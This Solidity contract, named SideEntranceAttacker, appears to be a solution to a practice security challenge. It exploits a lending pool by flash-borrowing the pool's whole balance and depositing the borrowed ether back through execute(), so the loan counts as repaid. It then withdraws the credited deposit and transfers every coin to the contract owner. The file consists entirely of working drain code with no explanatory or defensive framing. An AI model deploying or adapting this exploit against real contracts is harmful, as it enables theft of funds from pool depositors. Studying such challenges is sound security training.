pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {

    using Address for address payable;

    ISideEntranceLenderPool _pool;
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(ISideEntranceLenderPool pool) external {
        _pool = pool;

        uint256 poolBalance = address(_pool).balance;

        _pool.flashLoan(poolBalance);
        _pool.withdraw();
        payable(owner).transfer(poolBalance);
    }
    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }
    receive() external payable {}


}

